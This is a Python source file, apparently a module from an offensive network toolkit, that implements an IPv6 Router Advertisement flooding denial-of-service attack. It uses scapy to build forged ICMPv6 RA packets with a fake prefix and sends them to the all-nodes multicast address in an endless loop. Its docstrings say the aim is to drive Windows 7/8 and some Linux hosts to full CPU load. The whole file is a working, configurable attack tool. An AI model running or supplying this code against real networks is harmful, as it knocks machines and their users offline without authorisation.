import util
from time import sleep
from scapy.all import *
from dos import DoS
from threading import Thread


class ndp_dos(DoS):
    """ This is not patched by Microsoft.  Windows 7 and 8 are vulnerable,
        as well as a handful of (U|L)inux boxes.  IPv6 NDP was designed to
        replace the DHCP protocol.  When a system picks up an ICMPv6 Router
        Advertisement, it is essentially forcing the system to update their
        local networking information for the new router.  This DoS's the
        system's IPv6 networking.  When the network is flooded with these
        ICMPv6 RA's, the system's are hosed at 100% processor usage as they
        scramble to update routing tables, address info, etc.

        http://www.mh-sec.de/downloads/mh-RA_flooding_CVE-2010-multiple.txt
    """
    def __init__(self):
        super(ndp_dos, self).__init__('IPv6 Neighbor Discovery Protocol RA DoS')
        conf.verb = 0
        self.config.pop("target", None)
        self.config.update({"interval":{"type":"int", 
                                        "value":0.1,
                                        "required":False, 
                                  "display":"Interval to send advertisements"},
                            "prefix":{"type":"str", 
                                      "value":"ba11:a570::",
                                      "required":False, 
                                      "display":"Fake router IPv6 address"},
                            "count":{"type":"int", 
                                     "value":-1,
                                     "required":False,
                  "display":"Number of advertisements to send (-1 infinite)"}
                           })
        self.info = """
                    Exploits an unpatched vulnerability in the way Windows 7/8 handle
                    IPv6 NDP router advertisements.  After we send enough requests,
                    eventually the box consumes itself.

                    http://www.mh-sec.de/downloads/mh-RA_flooding_CVE-2010-multiple.txt
                    """

    def initialize(self):
        util.Msg('Starting Router Advertisement...')

        thread = Thread(target=self.spam)
        self.running = True
        thread.start()
        return True

    def spam(self):
        """ Spam the RA's based on user config
        """
        # build the forged packet
        pkt = IPv6(dst='ff02::1')
        pkt /= ICMPv6ND_RA()
        pkt /= ICMPv6NDOptPrefixInfo(prefixlen=64, 
                prefix=self.config['prefix']['value'])

        cnt = 0
        while self.running:
            if self.config['count']['value'] > 0 and \
                                    cnt >= self.config['count']['value']:
                self.running = False
                break

            send(pkt)
            cnt += 1
            sleep(self.config['interval']['value'])